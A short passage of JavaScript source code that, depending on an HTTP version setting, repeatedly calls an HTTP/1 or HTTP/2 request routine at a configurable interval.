        setInterval(() => { http2run() }, Number(delay) * 1000)
    } else if (version === 1) {
        setInterval(() => { http1run() }, Number(delay) * 1000)
    }
}
